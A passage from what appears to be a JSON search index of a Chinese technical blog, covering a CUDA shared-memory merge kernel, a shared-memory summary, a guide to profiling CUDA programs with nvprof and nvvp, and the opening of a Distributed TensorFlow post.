\u5de6\u53f3\u3002\u6df7\u5408\u7b97\u6cd5\u5c06\u539f\u6570\u636e\u96c6\u5212\u5206\u6210\u8bf8\u591a\u4e2a\u5c0f\u7684\u6570\u636e\u96c6\uff0c\u5206\u522b\u5bfb\u627e\u6bcf\u5757\u4e2d\u7684\u6700\u5c0f\u503c\uff0c\u7136\u540e\u518d\u5c06\u6bcf\u5757\u5f97\u5230\u7684\u7ed3\u679c\u6700\u7ec8\u5f52\u7ea6\u5230\u4e00\u4e2a\u503c\u4e2d\u3002\u8fd9\u79cd\u65b9\u6cd5\u548c\u5e76\u884c\u5f52\u7ea6\u7684\u601d\u60f3\u975e\u5e38\u76f8\u4f3c\uff0c\u4f46\u540c\u65f6\u53c8\u7701\u7565\u4e86\u5e76\u884c\u5f52\u7ea6\u4e2d\u7684\u591a\u6b21\u8fed\u4ee3\u3002\u4ee3\u7801\u66f4\u65b0\u5982\u4e0b\uff1a</p> <pre><code>#define REDUCTION_SIZE 8\n#define REDUCTION_SIZE_BIT_SHIFT 3\n#define MAX_ACTIVE_REDUCTIONS ((MAX_NUM_LISTS) / (REDUCTION_SIZE))\n\n__device__ void merge_array(const u32 *const src_array,\n                            u32 *const dest_array,\n                            const u32 num_lists,\n                            const u32 num_elements,\n                            const u32 tid)\n{\n    //\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u4ece\u539f\u6570\u7ec4\u4e2d\u8bfb\u5165\u4e00\u4e2a\u6570\u636e\uff0c\u7528\u4f5c\u9996\u6b21\u6bd4\u8f83\n    u32 data = src_array[tid];\n\n    //\u5f53\u524d\u7ebf\u7a0b\u6240\u5728\u7684\u6570\u636e\u5757\u7f16\u53f7\uff088\u4e2a\u7ebf\u7a0b\u4e3a\u4e00\u7ec4\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u5904\u7406\u4e00\u4e2a\u5217\u8868\uff09\n    const u32 s_idx = tid &gt;&gt; REDUCTION_SIZE_BIT_SHIFT;\n\n    //\u9996\u6b21\u8fdb\u884c\u5206\u522b\u5f52\u7ea6\u7684\u6570\u636e\u5757\u603b\u6570\n    const u32 num_reductions = num_lists &gt;&gt; REDUCTION_SIZE_BIT_SHIFT;\n    const u32 num_elements_per_list = num_elements / num_lists;\n\n    //\u5728\u5171\u4eab\u5185\u5b58\u4e2d\u521b\u5efa\u4e00\u4e2a\u5217\u8868\uff0c\u6307\u5411\u6bcf\u4e2a\u7ebf\u7a0b\u5f53\u524d\u6240\u5728\u7684\u5143\u7d20\uff0c\u5e76\u521d\u59cb\u5316\u4e3a0\n    __shared__ u32 list_indexes[MAX_NUM_LISTS];\n    list_indexes[tid] = 0;\n\n    //\u904d\u5386\u6240\u6709\u6570\u636e\n    for(u32 i=0; i&lt;num_elements; i++)\n    {\n        //\u6bcf\u4e2a\u6570\u636e\u5757\u5728\u5185\u90e8\u5f52\u7ea6\u540e\u90fd\u4f1a\u4ea7\u751f\u4e00\u4e2a\u76f8\u5e94\u7684\u6700\u5c0f\u503c\n        //\u5728\u5171\u4eab\u5185\u5b58\u4e2d\u5f00\u8f9f\u4e00\u4e2a\u5217\u8868\uff0c\u7528\u6765\u4fdd\u5b58\u6bcf\u7ec4\u7684\u6700\u5c0f\u503c\n  __shared__ u32 min_val[MAX_ACTIVE_REDUCTIONS];\n         __shared__ u32 min_tid;\n\n        //\u521d\u59cb\u5316\u6bcf\u4e2a\u6570\u636e\u5757\u7684\u5185\u90e8\u6700\u5c0f\u503c\n        if(tid &lt; num_lists)\n        {\n   min_val[s_idx] = 0xFFFFFFFF;\n             min_tid = 0xFFFFFFFF;\n        }\n        __syncthreads();\n\n        //\u5c06\u5f53\u524d\u7ebf\u7a0b\u7684\u6570\u636e\u4e0e\u6240\u5904\u6570\u636e\u5757\u7684\u6700\u5c0f\u503c\u8fdb\u884c\u6bd4\u8f83\uff0c\u5e76\u4fdd\u7559\u8f83\u5c0f\u7684\u90a3\u4e00\u4e2a\n        atomicMin(&amp;min_val[s_idx], data);\n\n        //\u8fdb\u884c\u5f52\u7ea6\u7684\u6570\u636e\u5757\u603b\u6570\u4e0d\u4e3a\u96f6\u65f6\n        if(num_reductions &gt; 0)\n        {\n            //\u786e\u4fdd\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u5df2\u7ecf\u5c06\u4e0a\u4e00\u6b65\u6bd4\u8f83\u64cd\u4f5c\u5b8c\u6210\n   __syncthreads();\n\n             //\u5c06\u6bcf\u4e2a\u6570\u636e\u5757\u4ea7\u751f\u7684\u6700\u5c0f\u503c\u4e0e\u96f6\u53f7\u6570\u636e\u5757\u7684\u6700\u5c0f\u503c\u8fdb\u884c\u6bd4\u8f83\uff0c\u4fdd\u7559\u8f83\u5c0f\u7684\u90a3\u4e00\u4e2a\n             if(tid &lt; num_reductions)\n             {\n    atomicMin(&amp;min_val[0], min_val[tid]);\n                  __syncthreads();\n             }\n\n             //\u5982\u679c\u5f53\u524d\u7ebf\u7a0b\u7684\u6570\u636e\u7b49\u4e8e\u6b64\u6b21\u6bd4\u8f83\u4fdd\u7559\u7684\u6700\u5c0f\u503c\uff0c\u8bb0\u5f55\u6700\u5c0f\u7ebf\u7a0b\u53f7\n             if(data == min_val[0])\n             {\n    atomicMin(&amp;min_tid, tid);\n             }\n             //\u786e\u4fdd\u4e0a\u4e00\u6b65\u64cd\u4f5c\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u5df2\u7ecf\u5b8c\u6210\uff0c\u624d\u80fd\u6267\u884c\u4e0b\u4e00\u53e5\n             __syncthreads();\n\n            //\u5982\u679c\u5f53\u524d\u7ebf\u7a0b\u53f7\u6070\u4e3a\u8bb0\u5f55\u4e0b\u7684\u6700\u5c0f\u7ebf\u7a0b\u53f7\n            if(tid == min_tid)\n            {\n                 //\u5f53\u524d\u6240\u6307\u5143\u7d20\u540e\u79fb\u4e00\u4f4d\n    list_indexes[tid]++;\n\n                 //\u5c06\u7ed3\u679c\u4fdd\u5b58\u5165\u7ed3\u679c\u6570\u7ec4\n                  dest_array[i] = data;\n\n                  //\u82e5\u8be5\u7ebf\u7a0b\u5bf9\u5e94\u7684\u5217\u8868\u5c1a\u672a\u88ab\u5904\u7406\u5b8c\n                  if(list_indexes[tid] &lt; num_elements_per_list)\n                      //\u66f4\u65b0\u8be5\u7ebf\u7a0b\u7684data\uff0c\u8fdb\u884c\u4e0b\u4e00\u8f6e\u6bd4\u8f83\n                      data = src_array[tid + (list_indexes[tid] * num_lists)];\n                  else\n                      data = 0xFFFFFFFF;\n            }\n            __syncthreads();\n        }\n    }\n}\n</code></pre> <p>\u6ce8\u610f\u5230\uff1a</p> <ol> <li>\u539f\u6765\u7684 min_val \u7531\u5355\u4e00\u7684\u6570\u636e\u6269\u5c55\u6210\u4e3a\u4e00\u4e2a\u5171\u4eab\u6570\u636e\u7684\u6570\u7ec4\uff0c\u8fd9\u662f\u56e0\u4e3a\u6bcf\u4e2a\u72ec\u7acb\u7684\u7ebf\u7a0b\u90fd\u9700\u8981\u4ece\u5b83\u5bf9\u5e94\u7684\u6570\u636e\u96c6\u4e2d\u83b7\u53d6\u5f53\u524d\u7684\u6700\u5c0f\u503c\u6765\u8fdb\u884c\u5185\u90e8\u6bd4\u8f83\u3002\u6bcf\u4e2a\u6700\u5c0f\u503c\u90fd\u662f\u4e00\u4e2a 32 \u4f4d\u7684\u6570\u503c\uff0c\u56e0\u6b64\u53ef\u4ee5\u5b58\u50a8\u5728\u72ec\u7acb\u7684\u5171\u4eab\u5185\u5b58\u5b58\u50a8\u4f53\u4e2d\u3002</li> <li>\u5185\u6838\u51fd\u6570\u4e2d\u7684 REDUCTION_SIZE \u7684\u503c\u88ab\u8bbe\u7f6e\u6210 8\uff0c\u610f\u5473\u7740\u6bcf\u4e2a\u6570\u636e\u5757\u4e2d\u5305\u542b 8 \u4e2a\u6570\u636e\uff0c\u7a0b\u5e8f\u5206\u522b\u627e\u51fa\u6bcf\u4e2a\u6570\u636e\u5757\u7684\u6700\u5c0f\u503c\uff0c\u7136\u540e\u518d\u5728\u8fd9\u4e9b\u6700\u5c0f\u503c\u4e2d\u5bfb\u627e\u6700\u7ec8\u7684\u6700\u5c0f\u503c\u3002</li> <li>\u5185\u6838\u51fd\u6570\u4e2d\u6700\u91cd\u8981\u7684\u4e00\u4e2a\u53d8\u5316\u662f\uff0c\u53ea\u6709\u6bcf\u6b21\u6bd4\u8f83\u7684\u6700\u5c0f\u503c\u6240\u5bf9\u5e94\u7684\u90a3\u4e2a\u7ebf\u7a0b\u7684 data \u624d\u4f1a\u66f4\u65b0\uff0c\u5176\u4ed6\u7ebf\u7a0b\u7684 data \u90fd\u4e0d\u4f1a\u66f4\u65b0\u3002\u800c\u5728\u4e4b\u524d\u7684\u5185\u6838\u51fd\u6570\u4e2d\uff0c\u6bcf\u8f6e\u6bd4\u8f83\u5f00\u59cb\uff0c\u6240\u6709\u7ebf\u7a0b\u90fd\u4f1a\u4ece\u5bf9\u5e94\u7684\u5217\u8868\u4e2d\u91cd\u65b0\u8bfb\u5165 data \u7684\u503c\uff0c\u968f\u7740 N \u7684\u589e\u5927\uff0c\u8fd9\u5c06\u53d8\u5f97\u8d8a\u6765\u8d8a\u4f4e\u6548\u3002</li> </ol>"},{"location":"blog/2018/11/25/cuda-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%80%BB%E7%BB%93-%E4%B8%80/#\u603b\u7ed3_1","title":"\u603b\u7ed3","text":"<ol> <li>\u5171\u4eab\u5185\u5b58\u5141\u8bb8\u540c\u4e00\u4e2a\u7ebf\u7a0b\u5757\u4e2d\u7684\u7ebf\u7a0b\u8bfb\u5199\u540c\u4e00\u6bb5\u5185\u5b58\uff0c\u4f46\u7ebf\u7a0b\u770b\u4e0d\u5230\u4e5f\u65e0\u6cd5\u4fee\u6539\u5176\u4ed6\u7ebf\u7a0b\u5757\u7684\u5171\u4eab\u5185\u5b58\u3002</li> <li>\u5171\u4eab\u5185\u5b58\u7684\u7f13\u51b2\u533a\u9a7b\u7559\u5728\u7269\u7406 GPU \u4e0a\uff0c\u6240\u4ee5\u8bbf\u95ee\u65f6\u7684\u5ef6\u8fdf\u8fdc\u4f4e\u4e8e\u8bbf\u95ee\u666e\u901a\u7f13\u51b2\u533a\u7684\u5ef6\u8fdf\uff0c\u56e0\u6b64\u9664\u4e86\u4f7f\u7528\u5bc4\u5b58\u5668\uff0c\u8fd8\u5e94\u66f4\u6709\u6548\u5730\u4f7f\u7528\u5171\u4eab\u5185\u5b58\uff0c\u5c24\u5176\u5f53\u6570\u636e\u6709\u91cd\u590d\u5229\u7528\uff0c\u6216\u5168\u5c40\u5185\u5b58\u5408\u5e76\uff0c\u6216\u7ebf\u7a0b\u95f4\u6709\u5171\u4eab\u6570\u636e\u7684\u65f6\u5019\u3002</li> <li>\u7f16\u5199\u4ee3\u7801\u65f6\uff0c\u5c06\u5173\u952e\u5b57_shared__\u6dfb\u52a0\u5230\u58f0\u660e\u4e2d\uff0c\u4f7f\u5f97\u8be5\u53d8\u91cf\u7559\u9a7b\u5728\u5171\u4eab\u5185\u5b58\u4e2d\uff0c\u5e76\u4e14\u7ebf\u7a0b\u5757\u4e2d\u7684\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u53ef\u4ee5\u5171\u4eab\u8fd9\u5757\u5185\u5b58\uff0c\u4f7f\u5f97\u4e00\u4e2a\u7ebf\u7a0b\u5757\u4e2d\u7684\u591a\u4e2a\u7ebf\u7a0b\u80fd\u591f\u5728\u8ba1\u7b97\u4e0a\u8fdb\u884c\u901a\u4fe1\u548c\u534f\u4f5c\u3002</li> <li>\u8c03\u7528 <code>__syncthreads()</code> \u51fd\u6570\u6765\u5b9e\u73b0\u7ebf\u7a0b\u7684\u540c\u6b65\u64cd\u4f5c\uff0c\u5c24\u5176\u8981\u6ce8\u610f\u786e\u4fdd\u5728\u8bfb\u53d6\u5171\u4eab\u5185\u5b58\u4e4b\u524d\uff0c\u60f3\u8981\u5199\u5165\u7684\u64cd\u4f5c\u90fd\u5df2\u7ecf\u5b8c\u6210\u3002\u53e6\u5916\u8fd8\u9700\u8981\u6ce8\u610f\uff0c\u5207\u4e0d\u53ef\u5c06\u8fd9\u4e2a\u51fd\u6570\u653e\u7f6e\u5728\u53d1\u6563\u5206\u652f\uff08\u67d0\u4e9b\u7ebf\u7a0b\u9700\u8981\u6267\u884c\uff0c\u800c\u5176\u4ed6\u7ebf\u7a0b\u4e0d\u9700\u8981\u6267\u884c\uff09\uff0c\u56e0\u4e3a\u9664\u975e\u7ebf\u7a0b\u5757\u4e2d\u7684\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u6267\u884c\u4e86\u8be5\u51fd\u6570\uff0c\u6ca1\u6709\u4efb\u4f55\u7ebf\u7a0b\u80fd\u591f\u6267\u884c\u4e4b\u540e\u7684\u6307\u4ee4\uff0c\u4ece\u800c\u5bfc\u81f4\u6b7b\u9501\u3002</li> <li>\u4e0d\u59a8\u5c1d\u8bd5\u4f7f\u7528\u5171\u4eab\u5185\u5b58\u5b9e\u73b0\u77e9\u9635\u4e58\u6cd5\u7684\u4f18\u5316\u3002</li> </ol>"},{"location":"blog/2018/12/07/quick-guide-to-cuda-profiling/","title":"Quick Guide to CUDA Profiling","text":"<p>\u5728\u5e76\u884c\u8ba1\u7b97\u9886\u57df\uff0c\u5f88\u96be\u901a\u8fc7\u7eaf\u7406\u8bba\u7684\u5206\u6790\u6765\u786e\u5b9a\u7a0b\u5e8f\u7684\u6027\u80fd\uff0c<code>GPGPU</code>\u8fd9\u79cd\u57fa\u4e8e\u7279\u5b9a\u8ba1\u7b97\u67b6\u6784\u7684\u8ba1\u7b97\u4efb\u52a1\u66f4\u751a\u3002\u4e8b\u5b9e\u4e0a\uff0c\u5f88\u591a\u5236\u7ea6\u5e76\u884c\u7b97\u6cd5\u6027\u80fd\u7684\u74f6\u9888\u5f88\u53ef\u80fd\u4e0d\u5728\u7b97\u6cd5\u672c\u8eab\uff08\u6bd4\u5982\u8d44\u6e90\u8c03\u5ea6\u969c\u788d\uff09\u3002\u56e0\u6b64\uff0c\u5bf9\u7ed9\u5b9a\u7a0b\u5e8f\u8fdb\u884c\u5145\u5206\u7684\u6027\u80fd\u6d4b\u8bd5\u4e0e\u540e\u7eed\u5206\u6790\u662f\u76f8\u5f53\u5fc5\u8981\u7684\u8c03\u4f18\u65b9\u6cd5\u3002</p> <p><code>Nvidia</code>\u63d0\u4f9b\u4e86<code>nvprof</code>\uff0c<code>nvvp</code>\uff0c<code>Nsight</code>\u4e09\u79cd cuda \u53ef\u7528\u7684\u6027\u80fd\u5206\u6790\u5de5\u5177\uff0c\u672c\u6587\u5c06\u7b80\u8ff0\u914d\u5408\u4f7f\u7528<code>nvprof</code>\u4e0e<code>nvvp</code>\u7684 cuda \u7a0b\u5e8f\u6027\u80fd\u5206\u6790\u65b9\u6cd5\u3002</p>"},{"location":"blog/2018/12/07/quick-guide-to-cuda-profiling/#check-out-device-properties","title":"Check Out Device Properties","text":"<p>\u7531\u4e8e cuda \u7a0b\u5e8f\u7684\u7ebf\u7a0b/\u5757\u5206\u914d\u65b9\u6848\u4e0e\u7a0b\u5e8f\u8fd0\u884c\u7684\u7684\u786c\u4ef6\u9ad8\u5ea6\u76f8\u5173\uff0c\u6545\u5bf9\u76ee\u6807\u5e73\u53f0\u7684\u786c\u4ef6\u53c2\u6570\u6709\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4e86\u89e3\u662f\u76f8\u5f53\u6709\u5fc5\u8981\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528<code>cudaGetDeviceProperties()</code>\u51fd\u6570\u83b7\u53d6\u8bbe\u5907\u7684\u5404\u9879\u5c5e\u6027\uff0c\u4e0b\u8ff0\u4ee3\u7801\u53ef\u4ee5\u7ed3\u5408<code>cuda_runtime_api.h#1218</code>\u5904<code>struct cudaDeviceProp</code>\u7684\u5b9a\u4e49\u548c\u5404\u5c5e\u6027\u7684\u76f8\u5e94\u6ce8\u89e3\u81ea\u884c\u7406\u89e3\u3002</p> <pre><code>int nDevices;\ncudaDeviceProp prop;\ncudaGetDeviceCount( &amp;nDevices );\nfor ( auto i = 0; i != nDevices; ++i )\n{\n cudaGetDeviceProperties( &amp;prop, i );\n // check out interesting property\n}\n</code></pre>"},{"location":"blog/2018/12/07/quick-guide-to-cuda-profiling/#profile-using-nvprof","title":"Profile Using Nvprof","text":""},{"location":"blog/2018/12/07/quick-guide-to-cuda-profiling/#quick-start","title":"Quick Start","text":"<pre><code>nvprof --help\n</code></pre>"},{"location":"blog/2018/12/07/quick-guide-to-cuda-profiling/#metrics","title":"Metrics","text":"<ul> <li>\u4f7f\u7528<code>--query-metrics</code>\u5217\u51fa\u6240\u6709\u53ef\u6d4b\u8bd5\u7684\u6027\u80fd\u6307\u6807\u3002</li> <li>\u4f7f\u7528<code>--metrics sm_efficiency,warp_execution_efficiency,...</code>\u6307\u5b9a\u8981\u6d4b\u8bd5\u7684\u6027\u80fd\u6307\u6807\u3002</li> </ul>"},{"location":"blog/2018/12/07/quick-guide-to-cuda-profiling/#pc-sampling","title":"PC Sampling","text":"<p>\u5728 CC5.2 \u6216\u66f4\u9ad8\u7684\u8bbe\u5907\u4e0a\u652f\u6301\u4f7f\u7528 PC \u91c7\u6837 (PC sampling) \u6280\u672f\u3002</p> <p>PC \u91c7\u6837\u6280\u672f\u901a\u8fc7<code>Round-Robin</code>\u65b9\u6cd5\u5bf9 SM \u4e2d\u6240\u6709\u6d3b\u52a8\u7ebf\u7a0b\u675f\u7684 PC \u72b6\u6001\u8fdb\u884c\u91c7\u6837\uff0c\u91c7\u6837\u7ed3\u679c\u5305\u542b\u5982\u4e0b\u4e24\u79cd\u53ef\u80fd\uff1a</p> <ul> <li>\u7ebf\u7a0b\u675f\u5b8c\u6210\u4e86\u5f53\u524d\u6307\u4ee4\u3002</li> <li>\u7ebf\u7a0b\u675f\u88ab<code>stall</code>\uff0c\u4e0d\u80fd\u5b8c\u6210\u5f53\u524d\u6307\u4ee4\uff0c\u5e76\u53ef\u4ee5\u7ed9\u51fa<code>stall</code>\u7684\u539f\u56e0\u3002</li> </ul> <p>\u4e8b\u5b9e\u4e0a\u7ebf\u7a0b\u675f\u88ab<code>stall</code>\u5e76\u4e0d\u4ee3\u8868\u6307\u4ee4\u6d41\u6c34\u7ebf\u5904\u4e8e<code>stall</code>\u72b6\u6001\uff0c\u56e0\u4e3a\u5176\u4ed6\u6b63\u5e38\u8fd0\u884c\u7684\u7ebf\u7a0b\u675f\u53ef\u4ee5\u5229\u7528\u8ba1\u7b97\u8d44\u6e90\u3002</p> <p>CC6.0 \u4ee5\u4e0a\u7684\u8bbe\u5907\u5bf9 PC \u91c7\u6837\u65b9\u6cd5\u8fdb\u884c\u4e86\u6539\u8fdb\uff0c\u901a\u8fc7\u68c0\u67e5\u7ebf\u7a0b\u675f\u8c03\u5ea6\u5668\u662f\u5426\u6267\u884c\u6307\u4ee4\u6765\u786e\u5b9a\u6307\u4ee4\u6d41\u6c34\u7ebf\u662f\u5426\u771f\u6b63\u5904\u4e8e<code>stall</code>\u72b6\u6001\uff0c\u4ece\u800c\u80fd\u6b63\u786e\u6307\u793a\u6307\u4ee4<code>stall</code>\u7684\u539f\u56e0\u3002</p>"},{"location":"blog/2018/12/07/quick-guide-to-cuda-profiling/#data-visualize-using-nvvp","title":"Data Visualize Using Nvvp","text":"<p><code>nvvp</code>\u53ef\u4ee5\u5bfc\u5165<code>nvprof</code>\u7684\u5206\u6790\u7ed3\u679c\uff0c\u53ef\u89c6\u5316\u663e\u793a\u7edf\u8ba1\u56fe\u8868\uff0c\u5e76\u4e14\u5efa\u8bae\u6027\u5730\u6307\u51fa\u7a0b\u5e8f\u53ef\u80fd\u5b58\u5728\u7684\u74f6\u9888\u3002</p> <p></p>      \u4ee5\u997c\u72b6\u56fe\u663e\u793a\u5404\u7c7b stall \u6bd4\u91cd      <p></p>      \u4ee5\u9891\u8c31\u663e\u793a\u5404\u7c7b\u6307\u4ee4\u6bd4\u4f8b  <p></p>      \u901a\u8fc7 source file mapping \u53ef\u89c6\u5316\u6307\u4ee4 stall \u72b6\u6001\uff0c\u9700\u8981\u5728\u7f16\u8bd1\u9009\u9879\u4e2d\u6307\u5b9a`-lineinfo`      <pre><code>nvprof -f --kernels \"kernelName\" --analysis-metrics -o a.nvvp &lt;task&gt; &lt;args&gt;\nnvvp a.nvvp\n</code></pre> <p>\u8fd9\u91cc\u6211\u4f7f\u7528\u7684\u65b9\u6cd5\u662f\u5728\u96c6\u7fa4\u4e0a\u7528<code>nvprof</code>\u505a\u6027\u80fd\u6d4b\u8bd5\uff0c\u4e4b\u540e\u5c06\u5206\u6790\u7ed3\u679c<code>*.nvvp</code>\u4f20\u56de\u672c\u5730\u7528<code>nvvp</code>\u505a\u53ef\u89c6\u5316\u3002</p>"},{"location":"blog/2018/12/07/quick-guide-to-cuda-profiling/#ext-remarks","title":"Ext. Remarks","text":""},{"location":"blog/2018/12/07/quick-guide-to-cuda-profiling/#tradeoff-between-registers-and-threads","title":"Tradeoff Between Registers and Threads","text":"<p>\u5728\u5b9e\u9645 Profiling \u4e2d\u91cd\u65b0\u8ba4\u8bc6\u4e86\u8fd9\u4e2a\u95ee\u9898\u3002</p> <p>\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c<code>nvcc</code>\u4e3a\u6bcf\u4e2a\u7ebf\u7a0b\u5206\u914d<code>maxRegsPerThread</code>\u4e2a\u6570\u7684\u5bc4\u5b58\u5668\uff0c\u5728Tesla K40\u4e0a\uff0c\u8fd9\u4e2a\u503c\u4e3a 64\u3002\u540c\u65f6\uff0c\u6bcf\u4e2a SM \u6301\u6709\u4e3a 65536 \u4e2a\u5bc4\u5b58\u5668\uff0c\u8fd9\u610f\u5473\u7740\u5355\u4e2a SM \u4e2d\u7684\u7ebf\u7a0b\u6570\u6700\u591a\u4e0d\u8d85\u8fc7 1024\u3002\u901a\u8fc7\u68c0\u67e5\u53c2\u6570\u8868\uff0c\u6211\u4eec\u53d1\u73b0\u8be5\u8bbe\u5907\u5355\u4e2a SM \u53ef\u5bb9\u7eb3\u7ebf\u7a0b\u6570\u4e3a 2048\u3002\u8fd9\u610f\u5473\u7740\u6211\u4eec\u8ba1\u7b97\u4efb\u52a1\u7684 GPU \u5229\u7528\u7387\u6700\u5927\u53ea\u6709 50%\uff08\u6240\u6709 SM \u5747\u6ee1\u8f7d\u7684\u72b6\u6001\u4e0b\uff09\u3002</p> <p>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u6211\u4eec\u5c06\u5206\u914d\u7ed9\u5355\u4e2a\u7ebf\u7a0b\u7684\u5bc4\u5b58\u5668\u6570\u76ee\u51cf\u534a\uff0c\u5219\u6700\u5927 GPU \u5229\u7528\u7387\u53ef\u4ee5\u8fbe\u5230 100%\u3002\u4f46\u82e5\u53d1\u751f\u5bc4\u5b58\u5668\u6ea2\u51fa\uff08register spilling\uff09\uff0c\u6ea2\u51fa\u7684\u5b58\u50a8\u7a7a\u95f4\u88ab\u653e\u5230\u7247\u5916\u7684 local memory\uff0c\u8bbf\u95ee\u901f\u5ea6\u5728\uff08\u540c\u5728\u7247\u5916\u7684\uff09global memory \u7ea7\u522b\u3002</p> <p>\u5728\u5b9e\u9645\u7684 CUDA \u6838\u51fd\u6570\u4e2d\uff0c\u80fd\u5168\u90e8\u5229\u7528 64 \u4e2a\u5bc4\u5b58\u5668\u7684\u60c5\u51b5\u5f88\u5c11\u3002\u5bc4\u5b58\u5668\u7684\u4f7f\u7528\u60c5\u51b5\u53ef\u4ee5\u5728 nvvp \u4e2d\u68c0\u67e5\uff0c\u5982\u679c\u53d1\u73b0\u6709\u5927\u91cf\u5bc4\u5b58\u5668\u6d6a\u8d39\uff0c\u53ef\u4ee5\u7acb\u5373\u51cf\u5c11\u5bc4\u5b58\u5668\u6570\u91cf\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u7ed3\u5408\u8ba1\u7b97\u4efb\u52a1\u7684\u91cf\u7ea7\u548c\u6027\u8d28\u6765\u8c03\u8282\u7ebf\u7a0b\u6700\u5927\u5bc4\u5b58\u5668\u6570\uff0c\u4ece\u800c\u8fbe\u5230\u6709\u9488\u5bf9\u6027\u7684\u6027\u80fd\u8c03\u4f18\u3002</p> <p>\u5728<code>nvcc</code>\u4e2d\u6307\u5b9a\u5355\u4e2a\u7ebf\u7a0b\u6700\u5927\u5bc4\u5b58\u5668\u6570\uff0c\u53ef\u4ee5\u6dfb\u52a0\u7f16\u8bd1\u9009\u9879<code>-maxrregcount=N</code>\u3002\u5982\u679c\u9650\u5b9a\u4e0d\u4fee\u6539\u7f16\u8bd1\u9009\u9879\u6216\u9700\u8981\u9010\u6838\u51fd\u6570\u6307\u5b9a\uff0c\u5219\u9700\u8981\u4f7f\u7528<code>__launch_bounds__</code>\u9650\u5b9a\u7b26\uff0c\u5982\u4e0b\uff08\u9690\u5f0f\u5730\u6307\u5b9a\u4e86\u6700\u5927\u5bc4\u5b58\u5668\u4e2a\u6570\uff09\uff1a</p> <pre><code>__global__ void\n__launch_bounds__(maxThreadsPerBlock, minBlocksPerMultiprocessor)\nMyKernel(...)\n{\n    ...\n}\n</code></pre> <p>\u5728\u6211\u7684<code>path tracer</code>\u4e2d\u5bf9\u4e0a\u8ff0\u65b9\u6cd5\u8fdb\u884c\u6d4b\u8bd5\uff0c\u5c06\u6bcf\u7ebf\u7a0b\u7684\u5bc4\u5b58\u5668\u6570\u51cf\u534a\u4e3a 32\uff0cSM \u7ebf\u7a0b\u6570\u52a0\u500d\u5e76\u6ee1\u8f7d\uff0cGPU \u5229\u7528\u7387\u7531 30+ \u63d0\u5347\u5230 70+\uff0c\u6267\u884c\u901f\u5ea6\u6709 1.5 \u500d\u5de6\u53f3\u7684\u63d0\u5347\u3002</p>"},{"location":"blog/2018/12/07/quick-guide-to-cuda-profiling/#tradeoff-between-blockdim-and-blockpersm","title":"Tradeoff Between BlockDim and BlockPerSM","text":"<p>\u5f53\u4e00\u4e2a\u5757\uff08block\uff09\u4e2d\u7684\u6240\u6709\u7ebf\u7a0b\u675f\uff08warp\uff09\u5168\u90e8\u5b8c\u6210\u65f6\uff0c\u8fd9\u4e2a\u5757\u624d\u53ef\u4ee5\u88ab SM \u8c03\u5ea6\u3002\u5982\u679c\u5757\u7684\u5927\u5c0f\u8fc7\u5927\uff0c\u5219\u5757\u7684\u8fd0\u884c\u901f\u5ea6\u53d7\u5355\u4e2a\u7ebf\u7a0b\u675f\u7ea6\u675f\u7684\u5f00\u9500\u5c31\u8d8a\u5927\uff08\u5982\u679c\u7b97\u6cd5\u5e76\u884c\u5ea6\u5f88\u9ad8\uff0c\u589e\u5927\u5757\u7684\u5927\u5c0f\u4e0d\u5931\u4e3a\u4e00\u4e2a\u597d\u9009\u62e9\uff09\uff1b\u5982\u679c\u5757\u7684\u5927\u5c0f\u8fc7\u5c0f\uff0c\u5219\u4e00\u65b9\u9762 SM \u53ef\u80fd\u65e0\u6cd5\u8fbe\u5230\u5176\u6700\u5927\u5229\u7528\u7387\uff08\u53d7<code>maxBlocksPerSM</code>\u7684\u9650\u5236\uff09\uff0c\u53e6\u4e00\u65b9\u9762 SM \u8c03\u5ea6\u5757\u7684\u989d\u5916\u5f00\u9500\u4e5f\u4f1a\u589e\u5927\u3002\u5c24\u5176\u662f\u9488\u5bf9\u4e0d\u540c\u7279\u70b9\u7684\u8ba1\u7b97\u4efb\u52a1\u6709\u4e0d\u540c\u7684\u66f4\u4f18\u9009\u62e9\uff0c\u5982<code>divergency</code>\u8f83\u9ad8\u7684\u4efb\u52a1\u66f4\u9002\u5408\u8f83\u5c0f\u7684 BlockDim\u3002\u6240\u4ee5\u5728\u9009\u62e9 BlockDim \u65f6\u4e0d\u4ec5\u8981\u5728\u7b97\u6cd5\u7684\u9002\u5e94\u6027\u4e0a\u505a\u8003\u8651\uff0c\u8fd8\u8981\u901a\u8fc7\u591a\u6b21\u6027\u80fd\u6d4b\u8bd5\u6765\u8fdb\u884c\u9488\u5bf9\u6027\u7684\u4f18\u5316\u3002</p>"},{"location":"blog/2018/12/07/quick-guide-to-cuda-profiling/#beware-of-ladder-effects","title":"Beware of Ladder Effects","text":"<p>\u6ce8\u610f\u8ba1\u7b97\u8d44\u6e90\u5206\u914d\u65f6\u8981\u6ce8\u610f\u5206\u914d\u7684\u8d44\u6e90\u91cf\u8981\u80fd\u591f\u88ab\u7ec4\u522b\u6574\u9664\uff0c\u5426\u5219\u4f1a\u51fa\u73b0\u65ad\u5c42\u72b6\u7684\u8d44\u6e90\u6d6a\u8d39\u73b0\u8c61\u3002</p> <p></p>      \u6bcf\u5757\u7ebf\u7a0b\u6570\u4e0e SM \u4e2d\u6700\u5927\u7ebf\u7a0b\u675f\u6570\u7684\u5173\u7cfb"},{"location":"blog/2018/12/23/distributed-tensorflow/","title":"Distributed Tensorflow","text":"<p>AI Generated Abstract</p> <p>\u672c\u6587\u4ecb\u7ecd\u4e86 TensorFlow \u7684\u5206\u5e03\u5f0f\u8ba1\u7b97\u65b9\u6cd5\uff0c\u5305\u62ec\u5355\u673a\u548c\u591a\u673a\u573a\u666f\u4e0b\u7684\u914d\u7f6e\u4e0e\u4f18\u5316\u3002\u5728\u5355\u673a\u6a21\u5f0f\u4e2d\uff0c\u8bb2\u89e3\u4e86\u5982\u4f55\u901a\u8fc7 log_device_placement \u53c2\u6570\u67e5\u770b\u8bbe\u5907\u5206\u914d\u3001\u4f7f\u7528 tf.device 